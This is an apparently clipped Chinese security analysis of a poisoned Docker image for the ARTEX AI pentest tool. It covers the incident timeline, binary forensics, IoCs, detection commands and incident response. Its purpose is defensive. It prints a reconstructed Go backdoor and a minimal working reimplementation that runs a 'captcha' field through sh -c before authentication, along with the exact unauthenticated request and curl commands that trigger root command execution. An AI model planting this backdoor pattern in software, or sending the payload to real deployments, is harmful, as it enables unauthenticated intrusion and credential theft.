---
title: 【微信】ARTEX二开投毒事件 · 研判与复现
source: https://mp.weixin.qq.com/s/XAmfQ03wKjaoLGqYZ-Q8xQ
source_host: mp.weixin.qq.com
clip_date: 2026-11-10T15:01:28+08:00
trace_id: a561acb8-d100-4b69-8a8f-4e0e02c7e59b
content_hash: 231b040cd19f653fbe39ca33bc2c3a21bee9837846ee9e4ce29706c5c448b0fb
status: synced
tags:
  - 微信
series: null
feed_source: 公众号聚合·Doonsec
ai_summary: null
ai_summary_style: null
images_status:
  total: 8
  succeeded: 8
  failed_urls: []
notion_page_id: 41475244-d011-813a-9c3a-e1b37efb13f8
ioc:
  cves: []
  cwes: []
  hashes:
    - a4f4d38c7b60f68abbd6a574aa59188063f2d86c
    - d5070f52262effe216b840711343bff8f2787f39208d887d8dfd9c673f8d1573
  domains: []
  tools: []
  techniques: []
---

**数字序言** *2026年11月10日 12:20*

## 0\. 一句话结论

ARTEX 原作者于 2026-10-08 闭源后，社区 fork 迅速填充空位；其中星标最高的 `trhhubsd/ARTEX` 被人 **只改了一行 **`docker-compose.yml` ，把镜像源从官方 `autumn27/artex` 换成当天新注册账号的 `tomicdd/artex` 。** 源码是干净的，毒在预编译镜像里的 **`/app/artex`** 二进制**：登录接口多出一个 `captcha` 字段，首字符为 `!` 时把剩余内容直接交给 `sh -c` 执行，并在账号密码校验之前返回 200 与命令输出—— **未认证、容器内 root、有回显，等价于一个 WebShell**。该镜像在被发现前已被拉取 **7,954 次**。

一句话的讽刺点： **做安全的人，被"安全工具"干掉了。**

## 1\. 事件速览（TL;DR）

| 维度  | 内容  |
| --- | --- |
| 投毒载体 | Docker 镜像 `tomicdd/artex:latest` |
| 投毒手法 | 一行 compose diff（镜像源替换）+ 预编译二进制植入后门 |
| 后门位置 | `/app/artex`<br><br>， `server/auth.go` 登录处理链（二进制内，源码中不存在） |
| 触发方式 | `POST /api/auth/login`<br><br>，JSON 中 `captcha` 字段以 `!` 开头 |
| 权限  | 容器内 `uid=0(root)` ，有命令回显 |
| 暴露面 | 默认 `8787:8787` 映射到 `0.0.0.0` （旧版本） |
| 已知拉取量 | 7,954 次（发现时） |
| 受害仓库 | `github.com/trhhubsd/ARTEX`<br><br>（发现时 1.3k★ / 642 fork；后规模涨至 2.2k★ / 1.07k fork，现已 404） |
| 披露者 | X 用户 `@Zaddyzaddy` （ZADDY）、 `@schertzt` （Todd Schertz）；仓库 Issue #7 |
| 公开报道 | 微信公众号「Hacking黑白红」，2026-11-04 23:59 |
| 处置状态 | 镜像与仓库后续均不可访问；官方要求按入侵事件处置 |

## 2\. 完整时间线

> 标注说明： **【证实】** = 有可复核的一手证据（commit / 制品指纹 / 响应实录）； **【报道】** = 仅媒体或当事人陈述； **【推断】** = 分析判断。

| 时间  | 主体  | 动作  | 影响  |
| --- | --- | --- | --- |
| 2026-09-03 | Autumn-27（李朴华，微步在线威胁检测工程师，个人项目） | ARTEX 在百度安全"Agent+"攻防能力挑战赛中夺冠 | 项目获得巨大曝光，从"小众工具"变成"人手一个" 【报道】 |
| 2026-10-03 22:49 | `jiwoochris` | 创建 `jiwoochris/artex-global` （英文默认，可切韩/中/西/日，AGPL-3.0） | 首个规模化海外二开分支，后续 2,990★ 【证实：GitHub API】 |
| 2026-10-08 | 境外媒体 / 韩国方面 | 报道 ARTEX 被用于针对韩国金融机构的数据窃取，涉及约 6.8 万人数据 | 工具被贴上"国家级事件工具"标签；原作者承受巨大压力 【报道】 |
| 2026-10-08 | Autumn-27 | 发布《ARTEX 安全声明》：项目不再更新、转为闭源、不再对外发布任何版本 | 官方供应链断裂， **fork 成为唯一供给源** ← 这是后续一切的前提 【证实：声明原文】 |
| 2026-10-08 18:50 UTC | `tomicdd` | 注册 Docker Hub 账号 | 空账号，无历史、无组织 【证实】 |
| 2026-10-08 13:45:50 UTC（构建时间戳） | 未知构建者 | 用 `github.com/Autumn-27/artex v0.3.16-0.20261008134550-5cdbd4bec94+dirty` 构建出带后门的 `/app/artex` | `+dirty`<br><br>\*\* = 工作区被改动过，且版本号晚于闭源时点\*\* 【证实：Go buildinfo】 |
| 2026-10-08 19:08 UTC | `tomicdd` | 推送镜像 `tomicdd/artex` 首个版本 | 制品先于 fork 仓库的 compose 修改落地 【证实】 |
| 2026-10-08 19:41 UTC | `tomicdd` | 最后一次 push（ `latest` 指向毒镜像） | 之后不再更新，稳定"钓鱼" 【证实】 |
| 2026-10-08 20:33 UTC | `trhhubsd/ARTEX` | commit `a4f4d38c7b60f68abbd6a574aa59188063f2d86c` ：\*\*只改 \*\* `docker-compose.yml` ， `autumn27/artex` → `tomicdd/artex` | 高星 fork 的"一键部署"路径被劫持 【证实：diff】 |
| 2026-10-12 01:40 | 某使用者 | 在微信群求助：用 ARTEX 挖洞时误删国内某政务系统大量数据 | 引发第二轮舆情，"AI 自动化渗透"的破坏力被直观展示 【报道】 |
| 2026-10-16 | 微步在线 | 公众号发布"全球首个多 AI Agent 渗透平台"，ARTEX 以 Artex Pro 形态进入 RedAgents | 项目被商业化收编，开源版彻底停止维护 【报道】 |
| 2026-10-18 | 安全社区 | 披露 ARTEX ≤ v0.3.14 存在 `/api/auth/init` 无条件密码重置 + MCP stdio 命令执行 | 存量部署本身已可被接管，与投毒形成"双通道" 【报道 + 公告 GHSA-q4j5-2wwq-gmq5】 |
| 2026-10-20 12:47 | 韩国 78 Research Lab（代表 김경동） | 发布 `78RL-ARTEX` ，面向韩国政府/企业安全负责人做"免开发可运营"改造 | "打不过就加入"名场面；后被指加剧生态混乱 【证实：X 帖 + 官网】 |
| 2026-11-04 01:42 UTC | 分析者 | 对干净实例做对照请求，返回 401 {"error":"用户名或密码错误"}（37 字节） | 建立"正常行为"基线 【证实：截图】 |
| 2026-11-04 05:09 | Todd Schertz（@schertzt） | 公开技术细节：镜像内置源码中不存在的 `verifyCaptcha` 函数，登录时取验证码字段并在密码校验前用 `sh -c` 执行后回传输出 | 完成归因链闭环 【证实：推文】 |
| 2026-11-04（同日） | ZADDY（@Zaddyzaddy） | 发帖："GitHub 上的 ARTEX 仓库有一个精巧的小后门……实时观察这些威胁行为者操作真是很有趣" | 事件在英文圈扩散 【证实：推文】 |
| 2026-11-04 23:59 | 公众号「Hacking黑白红」 | 发布《黑客AI工具ARTEX 二开被投毒！你 pull 的那个 Docker 镜像，可能是别人的后门》 | 中文圈大规模知晓 【证实：原文】 |
| 2026-11-06 | 微步在线 / 媒体 | 版权声明：拥有 ARTEX 版权，二开须遵守 AGPL-3.0 开源义务，商用需商业授权；并点名"10 月 8 日后公开发布的分支并非官方来源，注意供应链投毒风险" | 官方首次公开承认投毒风险；法律与合规压力转向 fork 维护者 【证实】 |
| 2026-11-09 | 78 Research Lab | 官网挂出「배포 중단（停止分发）」公告，改为仅对企业/机构邮件申请，学生与个人不再分发 | 韩方分支收缩 【证实：官网】 |
| 2026-11-10 | 本复核 | `github.com/trhhubsd/ARTEX`<br><br>、 `github.com/Autumn-27/ARTEX` 、 `github.com/mhtsec/ARTEX` 均返回 404 | 主要载体已被删除 【证实：HTTP 404】 |

## 3\. 背景：ARTEX 到底是什么

-   **定位**：AI 自主渗透测试系统（multi-agent LLM），目标是把"信息收集 → 资产测绘 → 漏洞探测 → 验证利用 → 链路推进"做成无人值守闭环。技术栈 Go + Next.js，默认端口 `8787` （前端/API）， `8788` 为辅助端口。
    
-   **作者**： `Autumn-27` ，媒体披露真名李朴华，微步在线威胁检测工程师；ARTEX 为其业余个人项目，后负责微步 RedAgents 产品。
    
-   **许可证**：AGPL-3.0 —— 这一条在后面很关键： **闭源停止维护 ≠ 许可证失效**，社区仍可合法 fork，但 fork 的维护者与构建者要自己背书。
    
-   **能力面**：内置 MCP 工具调用、LLM Profile 管理（存放 API Key）、任务/凭据管理、代理与流量模块。也就是说，跑 ARTEX 的那台机器天然是一个"凭据仓库"——这正是它成为投毒目标的原因。
    

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/59e82d8c50141f12.jpg)

## 4\. 前传：ARTEX 的三次"出圈"

理解投毒动机，必须先理解这个项目当时的处境。

**第一次：被用于攻击韩国金融业。** 境外报道称，有攻击者使用 ARTEX 对韩国多家银行/金融机构实施渗透，窃取约 6.8 万人数据，事件上升到政府层面。

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/ea542388d37ac709.png)

**第二次：误删政务数据。** 2026-10-12 凌晨，有使用者称用 ARTEX 挖洞时误删目标（国内某政务系统）大量数据，聊天记录在微信群与公众号大范围传播。舆论焦点从"工具强不强"转向"自主 Agent 的破坏半径谁负责"。

**第三次：闭源 + 商业化。** 2026-10-08 作者发布安全声明：项目不再更新、转为闭源。10-16 微步发布多 Agent 渗透平台，ARTEX 以 Artex Pro（企业版）形态出现，强调"全程可控、运行稳定、结果可追溯"。

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/f04f0b8737d6e9c0.png)

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/751eb8a112d88d7e.png)

**结果**：官方仓库关闭，但 AGPL 授权与已流出的代码不会消失。 **需求还在，供给断了 → fork 洪水。** 这就是投毒者等待的窗口。

## 5\. Fork 生态：供给真空期的"信任错配"

官方停更后，社区出现了几类分支，用户选择分支的实际依据往往只有两个： **star 数** 和 README 里的 `docker compose up -d` 。

| 分支  | 定位  | 规模（记录时） | 状态  |
| --- | --- | --- | --- |
| `Autumn-27/ARTEX` | 原官方 | —   | 已 404（闭源） |
| `trhhubsd/ARTEX` | 高星镜像/复刻 | 1.3k★ → 2.2k★，642 → 1,069 fork | **已被投毒**<br><br>，现 404 |
| `jiwoochris/artex-global` | 英文默认、多语种（韩/中/西/日） | 2,990★ | 存续  |
| `78RL-ARTEX` | 韩国 78 Research Lab 企业向改造 | —   | 官网"배포 중단" |
| `RuoJi6/ARTEX` | "Autumn-27/ARTEX 持续维护开源版本" | 1,506★ / 892 fork | 存续，持续 push |
| `mhtsec/ARTEX` | 早期高星复刻 | —   | 已 404 |

韩国 78 Research Lab 的二开是这批分支里"最正式"的一个：面向政府/企业信息安全负责人，主打"即使没有单独开发工作也能安装和运营"。它把二开从"改代码"推进到了"做产品分发"—— **分发包同样是信任链的放大器**。

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/043b8019964173d4.png)

**关键错配**：用户以为自己在"用 ARTEX"，实际上信任的是 **某个陌生账号的构建产物**。star 数衡量的是"别人也觉得好用"，不是"这个二进制没被动过"。

> 顺带记录一个观察：第三方启发式扫描器（scanrepo）对 `trhhubsd/artex` 给出 25/100 LOW，对 `RuoJi6/ARTEX` 给出 85/100 MALICIOUS。但两家命中的规则几乎一致（ `os/exec` 用法、 `curl | sh` 安装脚本、硬编码回环地址、mock 数据里的高熵字符串），本质是 **上游代码特性 + 启发式误报**。这说明： **扫描器给不出结论，制品指纹才能。** 本条为【推断】，不构成对任何分支的指控。

## 6\. 投毒技术复盘

### 6.0 披露链条

事件不是"厂商公告"式曝光，而是 **威胁情报研究者在实战观察中撞见**，再由当事仓库的 Issue 补齐证据：

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/a92443d43fa66148.jpg)

Todd Schertz 的补充把技术链条一次讲完了：

> `trhhubsd` 分支将 `docker-compose.yml` 修改为拉取 `tomicdd/artex` ，这是一个同一天制作的 Docker Hub 镜像，而不是原始项目的镜像。它包含一个源代码中不存在的 `verifyCaptcha` 函数。当有人登录时，它会获取验证码字段，并在密码检查之前使用 `sh -c` 运行它，然后将输出发送回去。  
> —— 2026-11-04 05:09

这条推文的价值在于三个"不含糊"： **指向明确的 diff**、 **明确的时间关系（"同一天制作"）**、 **明确的代码路径（密码校验之前）**。后续所有分析，本质上都是在给这三句话补证据。

### 6.1 攻击面选择：为什么"只改一行"

ARTEX 的部署体验被设计成极低门槛：

```bash
git clone <fork>
cd ARTEX
docker compose up -d
```

用户不会去 `docker build` ，因为 README 让他 `pull` 。于是 **构建环节从用户手里被转移到了镜像发布者手里**——这是本次事件的根因。

投毒者要做的只有一件事： **让 **`docker-compose.yml`** 里的 image 指向自己**。

### 6.2 那一行 diff

```bash
trhhubsd/ARTEX  commit a4f4d38c7b60f68abbd6a574aa59188063f2d86c
changes only: docker-compose.yml

- image: autumn27/artex:${ARTEX_TAG:-latest}
+ image: tomicdd/artex:${ARTEX_TAG:-latest}
```

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/8ed809991939c646.jpg)

**注意 diff 的"干净"程度**：没有新增脚本、没有改构建上下文、没有动 `.github/workflows` 、没有碰 `go.mod` 。任何"看 diff 找后门"的习惯动作，在这里都是空手而归。

### 6.3 基础设施画像与时序（最有价值的一段）

| 观测  | 值   |
| --- | --- |
| Docker Hub 账号 `tomicdd` 注册 | 2026-10-08 **18:50 UTC** |
| 镜像首次注册 | 2026-10-08 **19:08 UTC** |
| 镜像最后 push | 2026-10-08 **19:41 UTC** |
| fork 仓库 compose 修改（commit 时间） | 2026-10-08 **20:33 UTC** |
| 镜像拉取量（发现时） | **7,954** |
| 镜像 digest | `sha256:ce85d8369ccc1a85423f1f75d2f3afa2fab759e580da37a6891af2f7392745e` |
| 容器内 `/app/artex` sha256 | `sha256:d5070f52262effe216b840711343bff8f2787f39208d887d8dfd9c673f8d1573` |

**时序上有一个致命细节**：

```
18:50 UTC  账号注册
19:08 UTC  毒镜像上线
20:33 UTC  fork 仓库才改 compose 指向它
```

也就是说， **镜像比"指向它的那行 commit"早了一个半小时存在**。这不是"某个好心人重新构建了一版"，而是 **先备好毒制品，再把流量导过去**。注册即用、当天完成、之后再不更新——典型的"一次性投毒基础设施"特征。【推断，置信度高】

### 6.4 二进制取证：+dirty 是决定性证据

镜像内的 Go 构建元数据（ `go version -m` ）显示：

```
path  github.com/Autumn-27/artex
mod   github.com/Autumn-27/artex  v0.3.16-0.20261008134550-5cdbd4bec94+dirty
```

三个信息点，每一个都指向"人为改源码后自行构建"：

1.  模块路径是原始的 `github.com/Autumn-27/artex` ，不是任何 fork 的路径 → 构建者手里有原仓库代码。
    
2.  **伪版本 **`v0.3.16-0.20261008134550-5cdbd4bec94` → 基线提交 `5cdbd4bec94` ，时间戳 2026-10-08 13:45:50 UTC，** 晚于官方闭源声明**。
    
3.  `+dirty` → 工作区存在未提交改动。 **官方发布的制品不会带 dirty 标记。**
    

对照 fork 仓库自身可见源码：commit `e6ec569` ，版本 `v0.3.15` ，且 `server/auth.go` 中 **既没有 **`captcha`** 字段，也没有 **`verifyCaptcha`** 函数**。

> **后门只存在于预编译镜像，不存在于公开源码。** 源码审计 100% 通过，制品执行 100% 中招。

### 6.5 后门行为：把验证码字段当命令通道

重构后的处理链（据披露者给出的行号与行为描述）：

```typescript
// 重建示意：逻辑等价，非原始代码
func (h *Handler) authLogin(c *gin.Context) {
    var req struct {
        Username string`json:"username"`
        Password string`json:"password"`
        Captcha  string`json:"captcha"`   // ← 源码中不存在的新增字段
    }
    c.ShouldBindJSON(&req)

    // L278：检查首字节
    iflen(req.Captcha) > 0 && req.Captcha[0] == '!' {
        out := verifyCaptcha(req.Captcha[1:])

        // L288：在校验账号密码之前，直接 200 回显
        c.JSON(200, gin.H{"captcha": out, "error": ""})
        return                              // ← 后面两条校验永不执行
    }

    if !validUser(req.Username) { /* L291 */ }        // 用户名校验
    if !bcryptOK(req.Password)  { /* L304 */ }        // 密码校验（bcrypt）
}

func verifyCaptcha(cmd string) string {
    o, _ := exec.Command("sh", "-c", cmd).CombinedOutput()
    returnstring(o)                        // stdout + stderr 一起回传
}
```

为什么这个设计"精巧"（也是它极具隐蔽性的原因）：

-   **字段名合规**： `captcha` 是登录接口本来就"应该有"的字段，WAF/代码审计不会对"验证码字段"警觉。
    
-   **前置返回**：在身份校验之前 `return` ，绕开整条认证链，不需要伪造 JWT、不需要绕过中间件。
    
-   **单字符开关**：`!` 前缀 = 显式口令。正常请求（不带 `!`）走原逻辑， **功能测试、自动化回归全部通过**，用户毫无感知。
    
-   **有回显**： `CombinedOutput()` 把 stderr 也拼进来，等于自带 `2>&1` ，交互式运维体验极佳。
    
-   **函数名伪装**： `verifyCaptcha` 听上去是"校验图形验证码"，语义上完全正当。
    

### 6.6 请求/响应实录

**攻击请求（未认证）**：

```bash
POST /api/auth/login HTTP/1.1
Host: 127.0.0.1:8787
Content-Type: application/json

{"username":"x","password":"y","captcha":"!id"}
```

**毒镜像响应**：

```
HTTP/1.1 200 OK
Content-Type: application/json
Content-Length: 55

{"captcha":"uid=0(root) gid=0(root) groups=0(root)\n"}
```

```
HTTP/1.1 401 Unauthorized
Content-Type: application/json
Content-Length: 37

{"error":"用户名或密码错误"}
```

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/db6403f88fef6e74.png)

> **检测价值最高的一条**： `Content-Length: 55` + 响应体含 `"captcha"` 键 + 状态码 200。三者同时出现在登录失败场景，基本可以直接判定命中。

### 6.7 关于"root"的精确定性

报道口径是"未认证、root、有回显"。作为笔记需要补一句准确性说明：

-   **已证实**：命令在容器内以 `uid=0` 执行（ `id` 回显 `uid=0(root)` ）。
    
-   **取决于部署**：能否触及宿主机 root，要看是否挂载了 `docker.sock` 、是否 `privileged` 、是否把数据卷映射到宿主敏感路径。ARTEX 正常部署会挂载数据目录与 `.env` 。
    
-   **无论哪种**：容器内的 `.env` （LLM API Key、DB 口令）、Postgres 数据卷、任务凭据、MCP 配置 **全部可读**。对一台"渗透测试攻击机"而言，这已经足够致命——它上面通常还躺着 VPN、云厂商 AK、目标授权材料。
    

## 7\. 影响评估

### 7.1 直接暴露面

| 项   | 估算/观察 | 说明  |
| --- | --- | --- |
| 毒镜像拉取 | 7,954 次 | 不等于 7,954 台独立主机，但足以说明量级 |
| 默认监听 | 旧版 `8787:8787` → `0.0.0.0` | 公网 VPS 部署即对全网开放 |
| 后门认证要求 | 无   | 扫描器可发现并利用，无需任何凭据 |
| 利用成本 | 单个 HTTP 请求 | 可脚本化批量打 |

### 7.2 受害群体的特殊性

这起事件不同寻常的地方在于 **受害者画像**：

-   使用 ARTEX 的人，绝大多数是 **安全从业者、红队、乙方安服、甲方攻防**。
    
-   这些人的机器上通常存有： **客户授权书、目标资产清单、VPN/堡垒机凭据、云 AK/SK、LLM API Key、历史漏洞库**。
    
-   一旦被打，攻击者拿到的不是"一台机器"，而是 **一条通往多个企业内网的信任链**。
    

所以合理的影响判断是： **受害面窄，但单点价值极高**；且受害者本身具备发现能力却普遍没有发现，说明"工具信任"是当前最薄弱的环节。【推断】

### 7.3 二次风险：与已知漏洞叠加

ARTEX ≤ v0.3.14 自身存在两个问题（ `GHSA-q4j5-2wwq-gmq5` ）：

1.  `POST /api/auth/init` 无 setup token，未初始化实例可被任何人设置管理员密码（0.5.0 修复）。
    
2.  默认 `8787:8787` 全网绑定、登录无速率限制、密码最短 8 位（0.5.1 修复）。
    

于是形成 **双通道接管**：

```
通道 A（官方漏洞）：高并发打满 PG 连接 → "失效开放" 逻辑 → 覆盖管理员密码 → 合法 JWT → MCP stdio RCE
通道 B（投毒后门）：POST /api/auth/login + captcha "!cmd" → 直接命令执行，不需要任何前置
```

通道 B 更省事，且 **在任何版本号上都能用**——因为它根本不在源码里。

## 8\. 检测：三分钟自查

> 以下命令均为只读核查，不修改任何状态。将 `IMAGE` / `CONTAINER` 替换为实际值。

### 8.1 你拉的是哪个镜像？

```bash
# 1) 看 compose 里到底写了什么
grep -nE 'image:.*artex' docker-compose.yml

# 2) 看本地镜像的真实来源与 digest
docker image inspect tomicdd/artex:latest \
  --format '{{.Id}} | {{index .RepoDigests 0}} | {{.Created}}'

# 3) 与已知毒镜像 digest 比对（命中即沦陷）
#    毒: sha256:ce85d8369ccc1a85423f1f75d2f3afa2fab759e580da37a6891af2f7392745e
```

### 8.2 二进制里有没有那个函数？

```bash
# 构建元数据：出现 +dirty 或非 fork 路径，立即停用
docker run --rm --entrypoint sh tomicdd/artex:latest -c \
  'go version -m /app/artex 2>/dev/null | head -20 || strings /app/artex | grep -m5 Autumn-27'

# 符号/字符串侧写
docker run --rm --entrypoint sh tomicdd/artex:latest -c \
  'strings /app/artex | grep -iE "verifyCaptcha|captcha" | head'

# 二进制哈希比对
docker run --rm --entrypoint sh tomicdd/artex:latest -c 'sha256sum /app/artex'
# 毒: d5070f52262effe216b840711343bff8f2787f39208d887d8dfd9c673f8d1573
```

### 8.3 有没有被打过？（日志侧）

```swift
# 命中特征：登录请求体里 captcha 以 "!" 开头，且返回 200
grep -aE '"captcha"\s*:\s*"!' /var/lib/docker/containers/*/*-json.log

# 兜底：异常 200 的登录请求
grep -a '"/api/auth/login"' /var/lib/docker/containers/*/*-json.log \
  | grep -a '"status":"200"' | tail -50
```

### 8.4 暴露面自查（外网视角）

在 FOFA / Shodan / ZoomEye 上核查自己资产是否对公网暴露 ARTEX 面板（端口 8787/8788）。 **只要曾以旧版默认配置映射公网，就按已沦陷处理**——后门无需认证，暴露即等于被利用。

### 8.5 判定矩阵

| 观测  | 判定  |
| --- | --- |
| compose 指向 `tomicdd/artex` | **已中招**<br><br>（无论是否被打） |
| 镜像 digest = `ce85d8…2745e` | **已中招** |
| `/app/artex`<br><br>hash = `d5070f…1573` | **已中招** |
| 日志出现 `"captcha":"!` | **已被利用** |
| 只用官方 `autumn27/artex` 且版本 < 0.5.1 且曾公网暴露 | 按官方漏洞处置（另一条链） |

## 9\. 处置：一旦命中，按入侵事件走

> 先隔离，再取证，最后轮换。反过来做，等于给攻击者留出横向时间窗。

1.  **隔离**： `docker compose down` → 断网（安全组/防火墙）→ 不要先删容器（保留现场）。
    
2.  **取证**：
    

```bash
docker inspect <container> > /tmp/ir/container.json
docker logs <container> > /tmp/ir/app.log 2>&1
docker run --rm --entrypoint sh tomicdd/artex:latest -c 'sha256sum /app/artex' > /tmp/ir/hash.txt
tar -czf /tmp/ir/volumes.tgz <数据卷路径>
```

3.  **清除**： `docker rmi tomicdd/artex` + 删除数据卷 + 清理 build cache（ `docker builder prune` ）。
    
4.  **轮换（按爆炸半径，从高到低）**：
    

-   LLM API Key（OpenAI / Anthropic / 国内各厂商）
    
-   云厂商 AK/SK、OSS/S3 凭据
    
-   数据库口令（ARTEX 自带 Postgres + 任何被写入 Profile 的连接串）
    
-   VPN / 堡垒机 / SSH 私钥 / `authorized_keys`
    
-   MCP Server Token、Webhook（钉钉/飞书/企微/TG Bot）
    
-   Git / CI Token、镜像仓库凭据
    

6.  **主机层排查** （容器 root 常配合逃逸/持久化动作）：
    

```bash
crontab -l; ls -la /etc/cron.*; systemctl list-timers
cat ~/.ssh/authorized_keys; ls -la /etc/ssh/
docker ps -a --format '{{.Image}}\t{{.Names}}\t{{.Ports}}'
ss -antp | grep -vE ':(22|80|443)\b'   # 异常出站
find / -xdev -newermt '2026-10-08' -type f -perm -u+x 2>/dev/null | head -50
```

6.  **重建**： **重装系统** 优先级高于"清理干净"。已拿到容器内 root 且存在未知横向动作时，清理不具备可信度。
    
7.  **复盘**：把"是否从源码 `docker build` "写进团队规范。
    

## 10\. 复现记录（隔离环境）

> 仅在 **断网/仅主机网络** 的隔离虚拟机内进行；不对任何第三方资产发起请求；毒镜像可能已下架，取证价值在于"验证行为特征"，不在于"再打一次"。

### 10.1 环境

| 项   | 值   |
| --- | --- |
| 宿主  | 隔离 VM（无外网出口，或用 `--network none` ） |
| Docker | 24.x+ |
| 目标  | `tomicdd/artex:latest`<br><br>（若不可得，见 10.4 替代复现） |
| 网络  | `docker network create --internal lab` |

### 10.2 步骤与观测（对照表）

| #   | 操作  | 预期（毒镜像） | 预期（干净镜像） |
| --- | --- | --- | --- |
| 1   | `docker compose up -d` | 容器启动， `8787` 监听 | 同   |
| 2   | `docker image inspect`<br><br>看 digest | `ce85d8…2745e` | 其他  |
| 3   | `go version -m /app/artex` | 含 `+dirty` | 无 dirty |
| 4   | \`strings /app/artex | grep -i verifycaptcha\` | 有符号 |
| 5   | `curl -s -X POST :8787/api/auth/login -d '{"username":"x","password":"y","captcha":"!id"}'` | **200**<br><br>\+ `{"captcha":"uid=0(root)..."}` ，55 字节 | **401**<br><br>\+ {"error":"用户名或密码错误"}，37 字节 |
| 6   | 同上但不带 `!` | 401（与正常一致） | 401 |

**复现命令（可直接抄）**：

```bash
# 起服务（隔离网络）
docker network create --internal lab 2>/dev/null || true
docker run -d --name artex-lab --network lab -p 127.0.0.1:8787:8787 tomicdd/artex:latest

# 等待就绪
for i in $(seq 1 30); do curl -s -o /dev/null http://127.0.0.1:8787/ && break; sleep 1; done

# ① 基线（不带 !）
curl -s -i -X POST http://127.0.0.1:8787/api/auth/login \
  -H 'Content-Type: application/json' \
  -d '{"username":"x","password":"y","captcha":"1234"}'

# ② 后门触发（带 !）
curl -s -i -X POST http://127.0.0.1:8787/api/auth/login \
  -H 'Content-Type: application/json' \
  -d '{"username":"x","password":"y","captcha":"!id"}'

# ③ 取证后立即销毁
docker rm -f artex-lab && docker rmi tomicdd/artex:latest
```

### 10.3 观测记录模板（建议留档）

```css
[时间] 2026-11-XX  HH:MM
[镜像] tomicdd/artex:latest
[digest] sha256:ce85d8369ccc1a85423f1f75d2f3afa2fab759e580da37a6891af2f7392745e
[bin]    sha256:d5070f52262effe216b840711343bff8f2787f39208d887d8dfd9c673f8d1573
[build]  v0.3.16-0.20261008134550-5cdbd4bec94+dirty
[请求]  POST /api/auth/login  {"captcha":"!id"}
[响应]  HTTP/1.1 200  Content-Length: 55
        {"captcha":"uid=0(root) gid=0(root) groups=0(root)\n"}
[结论]  未认证命令执行，与公开披露一致
```

### 10.4 镜像已下架时的"无害复现"

镜像不可得时，用一段等价的最小实现验证 **代码路径本身** 是否成立（不联网、不落盘、仅本地）：

```go
// lab/main.go —— 仅用于理解"为什么源码审计查不出来"
package main

import (
    "net/http"
    "os/exec"
)

type loginReq struct {
    Username string`json:"username"`
    Password string`json:"password"`
    Captcha  string`json:"captcha"`// 新增字段：与"验证码"语义完全自洽
}

func main() {
    http.HandleFunc("/api/auth/login", func(w http.ResponseWriter, r *http.Request) {
        var q loginReq
        _ = decode(r, &q)

        iflen(q.Captcha) > 0 && q.Captcha[0] == '!' {
            out, _ := exec.Command("sh", "-c", q.Captcha[1:]).CombinedOutput()
            w.Header().Set("Content-Type", "application/json")
            w.WriteHeader(200) // 在鉴权前返回
            w.Write([]byte(`{"captcha":"` + string(out) + `"}`))
            return
        }
        w.WriteHeader(401)
        w.Write([]byte(`{"error":"用户名或密码错误"}`))
    })
    http.ListenAndServe("127.0.0.1:8787", nil)
}
```

复现结论： **只要"多一个字段 + 一次前置 return"，整条认证链就形同虚设**。这类后门在 code review 里几乎不会被当成漏洞——因为它长得像一个正常的验证码校验分支。

## 11\. 防御要点（写给"下次还会 fork 别人东西"的自己）

| 层次  | 做法  |
| --- | --- |
| **制品锁** | compose 里写 **digest**，不写 `latest` ，不写 tag： `image: repo@sha256:...` |
| **本地构建** | 安全类工具一律 `docker build` 自己构建；能读源码就不要信二进制 |
| **签名验证** | 优先选带 cosign/sigstore 签名或 SLSA provenance 的镜像， `cosign verify` 后再跑 |
| **网络边界** | 默认绑 `127.0.0.1` ，远端访问走 SSH 隧道或带认证的反代；绝不让 8787 裸奔公网 |
| **最小权限** | 不给 `privileged` ，不挂 `docker.sock` ，数据卷限路径， `--read-only` + tmpfs |
| **扫描别当结论** | Trivy/Grype/scanrepo 查不出"行为级后门"；二进制哈希比对 + `go version -m` 才是硬证据 |
| **供应链意识** | fork 的维护者 = 你的构建者 = 你的信任根。选星标不如选 **可追溯的人** |
| **分层隔离** | 跑攻击工具用一次性 VM/容器，凭据用完即焚，绝不与生产凭据同机 |

> 任何"一键 docker compose"的第三方安全工具，在 `image:` 未锁 digest、未经本地构建或签名验证之前， **不得在生产或持有真实凭据的主机上运行**。

## 12\. 证据强度与未确认项

| 事项  | 强度  | 说明  |
| --- | --- | --- |
| 存在后门、行为与回显特征 | 【证实】 | 有一手请求/响应实录与对照基线 |
| 后门仅存在于镜像、源码干净 | 【证实】 | 源码无 `captcha` / `verifyCaptcha` ，buildinfo 带 `+dirty` |
| 镜像先于 compose 修改存在 | 【证实】 | Docker Hub 时间戳 vs commit 时间戳 |
| 拉取量 7,954 | 【证实（时点值）】 | 单一时点快照，后续可能增长 |
| `tomicdd`<br><br>与 fork 维护者的关系 | 【未确认】 | 无公开归因；不排除匿名账号/第三方 PR 路径 |
| 投毒者身份与动机 | 【未确认】 | 从"先备镜像再导流"看具备预谋特征，但动机（窃密/囤积/嫁祸）无证据 |
| 是否存在 C2 外联 | 【未确认】 | 目前证据是"被动后门"（等人来敲），未见主动回连描述，但不排除 |
| 实际受害主机数量 | 【未确认】 | 拉取量 ≠ 沦陷量；无公开统计 |
| 韩方 78RL 分支与本次投毒是否相关 | 【未确认】 | 时间相邻但无技术关联证据；该分支官网已停止分发 |

> **不要把"时间相邻"写成"因果关系"。** 目前可以确定的因果只有一条链： `tomicdd` 镜像 → `trhhubsd` compose → 用户 pull → 未认证 RCE。

## 13\. IoC 附录

### 13.1 制品与代码

| 类型  | 值   |
| --- | --- |
| Docker Hub 账号 | `tomicdd`<br><br>（注册 2026-10-08 18:50 UTC） |
| 恶意镜像 | `tomicdd/artex:latest` |
| 镜像 digest | `sha256:ce85d8369ccc1a85423f1f75d2f3afa2fab759e580da37a6891af2f7392745e` |
| 恶意二进制 | `/app/artex` |
| 二进制 sha256 | `sha256:d5070f52262effe216b840711343bff8f2787f39208d887d8dfd9c673f8d1573` |
| 构建元数据 | `github.com/Autumn-27/artex v0.3.16-0.20261008134550-5cdbd4bec94+dirty` |
